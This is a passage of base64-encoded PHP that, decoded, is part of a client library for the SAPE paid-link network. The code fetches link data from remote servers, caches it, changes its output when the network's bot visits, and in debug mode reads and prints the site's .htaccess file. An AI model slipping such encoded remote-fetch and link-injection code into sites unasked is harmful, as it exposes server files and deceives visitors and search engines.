SCk7CiAgICAgICAgaWYgKCRmcCkgewogICAgICAgICAgICBjbGVhcnN0YXRjYWNoZSgpOwogICAgICAgICAgICAkbGVuZ3RoID0gQGZpbGVzaXplKCRmaWxlbmFtZSk7CgogICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICAkbXFyID0gQGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOwogICAgICAgICAgICAgICAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRsZW5ndGgpIHsKICAgICAgICAgICAgICAgICRkYXRhID0gQGZyZWFkKCRmcCwgJGxlbmd0aCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZGF0YSA9ICcnOwogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICBAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCRtcXIpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBAZmxvY2soJGZwLCBMT0NLX1VOKTsKICAgICAgICAgICAgQGZjbG9zZSgkZnApOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5fcmFpc2VfZXJyb3IoJ9Cd0LUg0LzQvtCz0YMg0YHRh9C40YLQsNGC0Ywg0LTQsNC90L3Ri9C1INC40Lcg0YTQsNC50LvQsDogJyAuICRmaWxlbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiDQpNGD0L3QutGG0LjRjyDQt9Cw0L/QuNGB0Lgg0LIg0LvQvtC60LDQu9GM0L3Ri9C5INGE0LDQudC7CiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfd3JpdGUoJGZpbGVuYW1lLCAkZGF0YSkKICAgIHsKCiAgICAgICAgJGZwID0gQGZvcGVuKCRmaWxlbmFtZSwgJ2FiJyk7CiAgICAgICAgaWYgKCRmcCkgewogICAgICAgICAgICBpZiAoZmxvY2soJGZwLCBMT0NLX0VYIHwgTE9DS19OQikpIHsKICAgICAgICAgICAgICAgIGZ0cnVuY2F0ZSgkZnAsIDApOwoKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsKICAgICAgICAgICAgICAgICAgICAkbXFyID0gQGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOwogICAgICAgICAgICAgICAgICAgIEBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgQGZ3cml0ZSgkZnAsICRkYXRhKTsKCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICAgICAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkbXFyKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBAZmxvY2soJGZwLCBMT0NLX1VOKTsKICAgICAgICAgICAgICAgIEBmY2xvc2UoJGZwKTsKCiAgICAgICAgICAgICAgICBpZiAobWQ1KCR0aGlzLT5fcmVhZCgkZmlsZW5hbWUpKSAhPSBtZDUoJGRhdGEpKSB7CiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZW5hbWUpOwoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yYWlzZV9lcnJvcign0J3QsNGA0YPRiNC10L3QsCDRhtC10LvQvtGB0YLQvdC+0YHRgtGMINC00LDQvdC90YvRhSDQv9GA0Lgg0LfQsNC/0LjRgdC4INCyINGE0LDQudC7OiAnIC4gJGZpbGVuYW1lKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPl9yYWlzZV9lcnJvcign0J3QtSDQvNC+0LPRgyDQt9Cw0L/QuNGB0LDRgtGMINC00LDQvdC90YvQtSDQsiDRhNCw0LnQuzogJyAuICRmaWxlbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiDQpNGD0L3QutGG0LjRjyDQvtCx0YDQsNCx0L7RgtC60Lgg0L7RiNC40LHQvtC6CiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfcmFpc2VfZXJyb3IoJGUpCiAgICB7CgogICAgICAgICR0aGlzLT5fZXJyb3JzW10gPSAkZTsKCiAgICAgICAgaWYgKCR0aGlzLT5fdmVyYm9zZSA9PSB0cnVlKSB7CiAgICAgICAgICAgIHByaW50ICc8cCBzdHlsZT0iY29sb3I6IHJlZDsgZm9udC13ZWlnaHQ6IGJvbGQ7Ij5TQVBFIEVSUk9SOiAnIC4gJGUgLiAnPC9wPic7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiDQn9C+0LvRg9GH0LjRgtGMINC40LzRjyDRhNCw0LnQu9CwINGBINC00LDQvdGL0LzQuAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZ2V0X2RiX2ZpbGUoKQogICAgewogICAgICAgIHJldHVybiAnJzsKICAgIH0KCiAgICAvKioKICAgICAqINCf0L7Qu9GD0YfQuNGC0YwgVVJJINC6INGF0L7RgdGC0YMg0LTQuNGB0L/QtdC90YHQtdGA0LAKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2dldF9kaXNwZW5zZXJfcGF0aCgpCiAgICB7CiAgICAgICAgcmV0dXJuICcnOwogICAgfQoKICAgIC8qKgogICAgICog0KHQvtGF0YDQsNC90LjRgtGMINC00LDQvdC90YvQtSwg0L/QvtC70YPRh9C10L3QvdGL0LUg0LjQtyDRhNCw0LnQu9CwLCDQsiDQvtCx0YrQtdC60YLQtQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3NldF9kYXRhKCRkYXRhKQogICAgewogICAgfQoKICAgIC8qKgogICAgICog0JfQsNCz0YDRg9C30LrQsCDQtNCw0L3QvdGL0YUKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9sb2FkX2RhdGEoKQogICAgewogICAgICAgICR0aGlzLT5fZGJfZmlsZSA9ICR0aGlzLT5fZ2V0X2RiX2ZpbGUoKTsKCiAgICAgICAgaWYgKCFpc19maWxlKCR0aGlzLT5fZGJfZmlsZSkpIHsKICAgICAgICAgICAgLy8g0J/Ri9GC0LDQtdC80YHRjyDRgdC+0LfQtNCw0YLRjCDRhNCw0LnQuy4KICAgICAgICAgICAgaWYgKEB0b3VjaCgkdGhpcy0+X2RiX2ZpbGUpKSB7CiAgICAgICAgICAgICAgICBAY2htb2QoJHRoaXMtPl9kYl9maWxlLCAwNjY2KTsgLy8g0J/RgNCw0LLQsCDQtNC+0YHRgtGD0L/QsAogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5fcmFpc2VfZXJyb3IoJ9Cd0LXRgiDRhNCw0LnQu9CwICcgLiAkdGhpcy0+X2RiX2ZpbGUgLiAnLiDQodC+0LfQtNCw0YLRjCDQvdC1INGD0LTQsNC70L7RgdGMLiDQktGL0YHRgtCw0LLQuNGC0LUg0L/RgNCw0LLQsCA3Nzcg0L3QsCDQv9Cw0L/QutGDLicpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoIWlzX3dyaXRhYmxlKCR0aGlzLT5fZGJfZmlsZSkpIHsKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5fcmFpc2VfZXJyb3IoJ9Cd0LXRgiDQtNC+0YHRgtGD0L/QsCDQvdCwINC30LDQv9C40YHRjCDQuiDRhNCw0LnQu9GDOiAnIC4gJHRoaXMtPl9kYl9maWxlIC4gJyEg0JLRi9GB0YLQsNCy0LjRgtC1INC/0YDQsNCy0LAgNzc3INC90LAg0L/QsNC/0LrRgy4nKTsKICAgICAgICB9CgogICAgICAgIEBjbGVhcnN0YXRjYWNoZSgpOwoKICAgICAgICAkZGF0YSA9ICR0aGlzLT5fcmVhZCgkdGhpcy0+X2RiX2ZpbGUpOwogICAgICAgIGlmICgKICAgICAgICAgICAgJHRoaXMtPl9mb3JjZV91cGRhdGVfZGIKICAgICAgICAgICAgfHwgKAogICAgICAgICAgICAgICAgISR0aGlzLT5faXNfb3VyX2JvdAogICAgICAgICAgICAgICAgJiYKICAgICAgICAgICAgICAgICgKICAgICAgICAgICAgICAgICAgICBmaWxlbXRpbWUoJHRoaXMtPl9kYl9maWxlKSA8ICh0aW1lKCkgLSAkdGhpcy0+X2NhY2hlX2xpZmV0aW1lKQogICAgICAgICAgICAgICAgICAgIHx8CiAgICAgICAgICAgICAgICAgICAgZmlsZXNpemUoJHRoaXMtPl9kYl9maWxlKSA9PSAwCiAgICAgICAgICAgICAgICAgICAgfHwKICAgICAgICAgICAgICAgICAgICBAdW5zZXJpYWxpemUoJGRhdGEpID09IGZhbHNlCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgICApIHsKICAgICAgICAgICAgLy8g0KfRgtC+0LHRiyDQvdC1INC/0L7QstC10YHQuNGC0Ywg0L/Qu9C+0YnQsNC00LrRgyDQutC70LjQtdC90YLQsCDQuCDRh9GC0L7QsdGLINC90LUg0LHRi9C70L4g0L7QtNC90L7QstGA0LXQvNC10L3QvdGL0YUg0LfQsNC/0YDQvtGB0L7QsgogICAgICAgICAgICBAdG91Y2goJHRoaXMtPl9kYl9maWxlLCAodGltZSgpIC0gJHRoaXMtPl9jYWNoZV9saWZldGltZSArICR0aGlzLT5fY2FjaGVfcmVsb2FkdGltZSkpOwoKICAgICAgICAgICAgJHBhdGggPSAkdGhpcy0+X2dldF9kaXNwZW5zZXJfcGF0aCgpOwogICAgICAgICAgICBpZiAoc3RybGVuKCR0aGlzLT5fY2hhcnNldCkpIHsKICAgICAgICAgICAgICAgICRwYXRoIC49ICcmY2hhcnNldD0nIC4gJHRoaXMtPl9jaGFyc2V0OwogICAgICAgICAgICB9CgogICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+X3NlcnZlcl9saXN0IGFzICRzZXJ2ZXIpIHsKICAgICAgICAgICAgICAgIGlmICgkZGF0YSA9ICR0aGlzLT5fZmV0Y2hfcmVtb3RlX2ZpbGUoJHNlcnZlciwgJHBhdGgpKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN1YnN0cigkZGF0YSwgMCwgMTIpID09ICdGQVRBTCBFUlJPUjonKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5fcmFpc2VfZXJyb3IoJGRhdGEpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFvQv9GB0LXQstC00L5d0L/RgNC+0LLQtdGA0LrQsCDRhtC10LvQvtGB0YLQvdC+0YHRgtC4OgogICAgICAgICAgICAgICAgICAgICAgICAkaGFzaCA9IEB1bnNlcmlhbGl6ZSgkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaGFzaCAhPSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8g0L/QvtC/0YvRgtCw0LXQvNGB0Y8g0LfQsNC/0LjRgdCw0YLRjCDQutC+0LTQuNGA0L7QstC60YMg0LIg0LrQtdGICiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaGFzaFsnX19zYXBlX2NoYXJzZXRfXyddICAgICAgPSAkdGhpcy0+X2NoYXJzZXQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaGFzaFsnX19sYXN0X3VwZGF0ZV9fJ10gICAgICAgPSB0aW1lKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaGFzaFsnX19tdWx0aV9zaXRlX18nXSAgICAgICAgPSAkdGhpcy0+X211bHRpX3NpdGU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaGFzaFsnX19mZXRjaF9yZW1vdGVfdHlwZV9fJ10gPSAkdGhpcy0+X2ZldGNoX3JlbW90ZV90eXBlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhhc2hbJ19faWdub3JlX2Nhc2VfXyddICAgICAgID0gJHRoaXMtPl9pZ25vcmVfY2FzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoYXNoWydfX3BocF92ZXJzaW9uX18nXSAgICAgICA9IHBocHZlcnNpb24oKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoYXNoWydfX3NlcnZlcl9zb2Z0d2FyZV9fJ10gICA9ICRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGF0YV9uZXcgPSBAc2VyaWFsaXplKCRoYXNoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZGF0YV9uZXcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9ICRkYXRhX25ldzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+X3dyaXRlKCR0aGlzLT5fZGJfZmlsZSwgJGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vINCj0LHQuNCy0LDQtdC8IFBIUFNFU1NJRAogICAgICAgIGlmIChzdHJsZW4oc2Vzc2lvbl9pZCgpKSkgewogICAgICAgICAgICAkc2Vzc2lvbiAgICAgICAgICAgID0gc2Vzc2lvbl9uYW1lKCkgLiAnPScgLiBzZXNzaW9uX2lkKCk7CiAgICAgICAgICAgICR0aGlzLT5fcmVxdWVzdF91cmkgPSBzdHJfcmVwbGFjZShhcnJheSgnPycgLiAkc2Vzc2lvbiwgJyYnIC4gJHNlc3Npb24pLCAnJywgJHRoaXMtPl9yZXF1ZXN0X3VyaSk7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+X3NldF9kYXRhKEB1bnNlcmlhbGl6ZSgkZGF0YSkpOwoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JldHVybl9vYmxpZ2F0b3J5X3BhZ2VfY29udGVudCgpCiAgICB7CiAgICAgICAgJHNfZ2xvYmFscyA9IG5ldyBTQVBFX2dsb2JhbHMoKTsKCiAgICAgICAgJGh0bWwgPSAnJzsKICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9wYWdlX29ibGlnYXRvcnlfb3V0cHV0KSAmJiAhZW1wdHkoJHRoaXMtPl9wYWdlX29ibGlnYXRvcnlfb3V0cHV0KQogICAgICAgICAgICAmJiBmYWxzZSA9PSAkc19nbG9iYWxzLT5wYWdlX29ibGlnYXRvcnlfb3V0cHV0X3Nob3duKCkKICAgICAgICApIHsKICAgICAgICAgICAgJHNfZ2xvYmFscy0+cGFnZV9vYmxpZ2F0b3J5X291dHB1dF9zaG93bih0cnVlKTsKICAgICAgICAgICAgJGh0bWwgPSAkdGhpcy0+X3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXQ7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGh0bWw7CiAgICB9CgogICAgLyoqCiAgICAgKiDQktC10YDQvdGD0YLRjCBqcy3QutC+0LQKICAgICAqIC0g0YDQsNCx0L7RgtCw0LXRgiDRgtC+0LvRjNC60L4g0LrQvtCz0LTQsCDQv9Cw0YDQsNC80LXRgtGAINC60L7QvdGB0YLRgNGD0LrRgtC+0YDQsCBzaG93X2NvdW50ZXJfc2VwYXJhdGVseSA9IHRydWUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcmV0dXJuX2NvdW50ZXIoKQogICAgewogICAgICAgIC8v0LXRgdC70Lggc2hvd19jb3VudGVyX3NlcGFyYXRlbHkgPSBmYWxzZSDQuCDQstGL0L/QvtC70L3QtdC9INCy0YvQt9C+0LIg0Y3RgtC+0LPQviDQvNC10YLQvtC00LAsCiAgICAgICAgLy/RgtC+INC30LDQsdC70L7QutC40YDQvtCy0LDRgtGMINCy0YvQstC+0LQganMt0LrQvtC00LAg0LLQvNC10YHRgtC1INGBINC60L7QvdGC0LXQvdGC0L7QvAogICAgICAgIGlmIChmYWxzZSA9PSAkdGhpcy0+X3Nob3dfY291bnRlcl9zZXBhcmF0ZWx5KSB7CiAgICAgICAgICAgICR0aGlzLT5fc2hvd19jb3VudGVyX3NlcGFyYXRlbHkgPSB0cnVlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5fcmV0dXJuX29ibGlnYXRvcnlfcGFnZV9jb250ZW50KCk7CiAgICB9Cn0KCi8qKgogKiDQk9C70L7QsdCw0LvRjNC90YvQtSDRhNC70LDQs9C4CiAqLwpjbGFzcyBTQVBFX2dsb2JhbHMKewoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZ2V0X3RvZ2dsZV9mbGFnKCRuYW1lLCAkdG9nZ2xlID0gZmFsc2UpCiAgICB7CgogICAgICAgIHN0YXRpYyAkZmxhZ3MgPSBhcnJheSgpOwoKICAgICAgICBpZiAoIWlzc2V0KCRmbGFnc1skbmFtZV0pKSB7CiAgICAgICAgICAgICRmbGFnc1skbmFtZV0gPSBmYWxzZTsKICAgICAgICB9CgogICAgICAgIGlmICgkdG9nZ2xlKSB7CiAgICAgICAgICAgICRmbGFnc1skbmFtZV0gPSB0cnVlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRmbGFnc1skbmFtZV07CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGJsb2NrX2Nzc19zaG93bigkdG9nZ2xlID0gZmFsc2UpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5fZ2V0X3RvZ2dsZV9mbGFnKCdibG9ja19jc3Nfc2hvd24nLCAkdG9nZ2xlKTsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gYmxvY2tfaW5zX2JlZm9yZWFsbF9zaG93bigkdG9nZ2xlID0gZmFsc2UpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5fZ2V0X3RvZ2dsZV9mbGFnKCdibG9ja19pbnNfYmVmb3JlYWxsX3Nob3duJywgJHRvZ2dsZSk7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHBhZ2Vfb2JsaWdhdG9yeV9vdXRwdXRfc2hvd24oJHRvZ2dsZSA9IGZhbHNlKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+X2dldF90b2dnbGVfZmxhZygncGFnZV9vYmxpZ2F0b3J5X291dHB1dF9zaG93bicsICR0b2dnbGUpOwogICAgfQp9CgovKioKICog0JrQu9Cw0YHRgSDQtNC70Y8g0YDQsNCx0L7RgtGLINGBINC+0LHRi9GH0L3Ri9C80Lgg0YHRgdGL0LvQutCw0LzQuAogKi8KY2xhc3MgU0FQRV9jbGllbnQgZXh0ZW5kcyBTQVBFX2Jhc2UKewoKICAgIHByb3RlY3RlZCAkX2xpbmtzX2RlbGltaXRlciA9ICcnOwogICAgcHJvdGVjdGVkICRfbGlua3MgICAgICAgICAgID0gYXJyYXkoKTsKICAgIHByb3RlY3RlZCAkX2xpbmtzX3BhZ2UgICAgICA9IGFycmF5KCk7CiAgICBwcm90ZWN0ZWQgJF90ZWFzZXJzX3BhZ2UgICAgPSBhcnJheSgpOwoKICAgIHByb3RlY3RlZCAkX3VzZXJfYWdlbnQgICAgICAgICA9ICdTQVBFX0NsaWVudCBQSFAnOwogICAgcHJvdGVjdGVkICRfc2hvd19vbmx5X2Jsb2NrICAgID0gZmFsc2U7CiAgICBwcm90ZWN0ZWQgJF9ibG9ja190cGwgICAgICAgICAgPSAnJzsKICAgIHByb3RlY3RlZCAkX2Jsb2NrX3RwbF9vcHRpb25zICA9IGFycmF5KCk7CiAgICBwcm90ZWN0ZWQgJF9ibG9ja191cmlfaWRuYSAgICAgPSBhcnJheSgpOwogICAgcHJvdGVjdGVkICRfcmV0dXJuX2xpbmtzX2NhbGxzOwogICAgcHJvdGVjdGVkICRfdGVhc2Vyc19jc3Nfc2hvd2VkID0gZmFsc2U7CgogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICBwYXJlbnQ6Ol9fY29uc3RydWN0KCRvcHRpb25zKTsKCiAgICAgICAgJHRoaXMtPl9sb2FkX2RhdGEoKTsKICAgIH0KCiAgICAvKioKICAgICAqINCe0LHRgNCw0LHQvtGC0LrQsCBodG1sINC00LvRjyDQvNCw0YHRgdC40LLQsCDRgdGB0YvQu9C+0LoKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAkaHRtbAogICAgICogQHBhcmFtIG51bGx8YXJyYXkgJG9wdGlvbnMKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JldHVybl9hcnJheV9saW5rc19odG1sKCRodG1sLCAkb3B0aW9ucyA9IG51bGwpCiAgICB7CgogICAgICAgIGlmIChlbXB0eSgkb3B0aW9ucykpIHsKICAgICAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOwogICAgICAgIH0KCiAgICAgICAgLy8g0LXRgdC70Lgg0LfQsNC/0YDQvtGI0LXQvdCwINC+0L/RgNC10LTQtdC70LXQvdC90LDRjyDQutC+0LTQuNGA0L7QstC60LAsINC4INC40LfQstC10YHRgtC90LAg0LrQvtC00LjRgNC+0LLQutCwINC60LXRiNCwLCDQuCDQvtC90Lgg0YDQsNC30L3Ri9C1LCDQutC+0L3QstC10YDRgtC40YDRg9C10Lwg0LIg0LfQsNC00LDQvdC90YPRjgogICAgICAgIGlmICgKICAgICAgICAgICAgc3RybGVuKCR0aGlzLT5fY2hhcnNldCkgPiAwCiAgICAgICAgICAgICYmCiAgICAgICAgICAgIHN0cmxlbigkdGhpcy0+X3NhcGVfY2hhcnNldCkgPiAwCiAgICAgICAgICAgICYmCiAgICAgICAgICAgICR0aGlzLT5fc2FwZV9jaGFyc2V0ICE9ICR0aGlzLT5fY2hhcnNldAogICAgICAgICAgICAmJgogICAgICAgICAgICBmdW5jdGlvbl9leGlzdHMoJ2ljb252JykKICAgICAgICApIHsKICAgICAgICAgICAgJG5ld19odG1sID0gQGljb252KCR0aGlzLT5fc2FwZV9jaGFyc2V0LCAkdGhpcy0+X2NoYXJzZXQsICRodG1sKTsKICAgICAgICAgICAgaWYgKCRuZXdfaHRtbCkgewogICAgICAgICAgICAgICAgJGh0bWwgPSAkbmV3X2h0bWw7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkdGhpcy0+X2lzX291cl9ib3QpIHsKCiAgICAgICAgICAgICRodG1sID0gJzxzYXBlX25vaW5kZXg+JyAuICRodG1sIC4gJzwvc2FwZV9ub2luZGV4Pic7CgogICAgICAgICAgICBpZiAoaXNzZXQoJG9wdGlvbnNbJ2lzX2Jsb2NrX2xpbmtzJ10pICYmIHRydWUgPT0gJG9wdGlvbnNbJ2lzX2Jsb2NrX2xpbmtzJ10pIHsKCiAgICAgICAgICAgICAgICBpZiAoIWlzc2V0KCRvcHRpb25zWydub2ZfbGlua3NfcmVxdWVzdGVkJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG9wdGlvbnNbJ25vZl9saW5rc19yZXF1ZXN0ZWQnXSA9IDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWlzc2V0KCRvcHRpb25zWydub2ZfbGlua3NfZGlzcGxheWVkJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG9wdGlvbnNbJ25vZl9saW5rc19kaXNwbGF5ZWQnXSA9IDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWlzc2V0KCRvcHRpb25zWydub2Zfb2JsaWdhdG9yeSddKSkgewogICAgICAgICAgICAgICAgICAgICRvcHRpb25zWydub2Zfb2JsaWdhdG9yeSddID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJG9wdGlvbnNbJ25vZl9jb25kaXRpb25hbCddKSkgewogICAgICAgICAgICAgICAgICAgICRvcHRpb25zWydub2ZfY29uZGl0aW9uYWwnXSA9IDA7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGh0bWwgPSAnPHNhcGVfYmxvY2sgbm9mX3JlcT0iJyAuICRvcHRpb25zWydub2ZfbGlua3NfcmVxdWVzdGVkJ10gLgogICAgICAgICAgICAgICAgICAgICAgICAnIiBub2ZfZGlzcGw9IicgLiAkb3B0aW9uc1snbm9mX2xpbmtzX2Rpc3BsYXllZCddIC4KICAgICAgICAgICAgICAgICAgICAgICAgJyIgbm9mX29ibGlnPSInIC4gJG9wdGlvbnNbJ25vZl9vYmxpZ2F0b3J5J10gLgogICAgICAgICAgICAgICAgICAgICAgICAnIiBub2ZfY29uZD0iJyAuICRvcHRpb25zWydub2ZfY29uZGl0aW9uYWwnXSAuCiAgICAgICAgICAgICAgICAgICAgICAgICciPicgLiAkaHRtbCAuCiAgICAgICAgICAgICAgICAgICAgICAgICc8L3NhcGVfYmxvY2s+JzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRodG1sOwogICAgfQoKICAgIC8qKgogICAgICog0KTQuNC90LDQu9GM0L3QsNGPINC+0LHRgNCw0LHQvtGC0LrQsCBodG1sINC/0LXRgNC10LQg0LLRi9Cy0L7QtNC+0Lwg0YHRgdGL0LvQvtC6CiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkaHRtbAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfcmV0dXJuX2h0bWwoJGh0bWwpCiAgICB7CiAgICAgICAgaWYgKGZhbHNlID09ICR0aGlzLT5fc2hvd19jb3VudGVyX3NlcGFyYXRlbHkpIHsKICAgICAgICAgICAgJGh0bWwgPSAkdGhpcy0+X3JldHVybl9vYmxpZ2F0b3J5X3BhZ2VfY29udGVudCgpIC4gJGh0bWw7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPl9hZGRfZGVidWdfaW5mbygkaHRtbCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9hZGRfZGVidWdfaW5mbygkaHRtbCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPl9kZWJ1ZykgewogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5fbGlua3NbJ19fc2FwZV90ZWFzZXJfaW1hZ2VzX3BhdGhfXyddKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPl9hZGRfZmlsZV9jb250ZW50X2Zvcl9kZWJ1ZygkdGhpcy0+X2xpbmtzWydfX3NhcGVfdGVhc2VyX2ltYWdlc19wYXRoX18nXSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRoaXMtPl9hZGRfZmlsZV9jb250ZW50X2Zvcl9kZWJ1ZygnLmh0YWNjZXNzJyk7CgogICAgICAgICAgICAkaHRtbCAuPSAkdGhpcy0+X2RlYnVnX291dHB1dCgkdGhpcyk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGh0bWw7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9hZGRfZmlsZV9jb250ZW50X2Zvcl9kZWJ1ZygkZmlsZV9uYW1lKQogICAgewogICAgICAgICRwYXRoICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IHJlYWxwYXRoKAogICAgICAgICAgICBydHJpbSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCBESVJFQ1RPUllfU0VQQVJBVE9SKQogICAgICAgICAgICAuIERJUkVDVE9SWV9TRVBBUkFUT1IKICAgICAgICAgICAgLiBzdHJ0b2soJGZpbGVfbmFtZSwgJz8nKQogICAgICAgICk7CiAgICAgICAgJHRoaXMtPl9maWxlX2NvbnRlbnRzX2Zvcl9kZWJ1Z1skZmlsZV9uYW1lXVsncGF0aCddID0gJHBhdGg7CiAgICAgICAgaWYgKCRwYXRoKSB7CiAgICAgICAgICAgICR0aGlzLT5fZmlsZV9jb250ZW50c19mb3JfZGVidWdbJGZpbGVfbmFtZV1bJ2NvbnRlbnRzJ10gPSBAZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEXRgdC70Lgg0LfQsNC/0YDQvtGI0LXQvdCwINC+0L/RgNC10LTQtdC70LXQvdC90L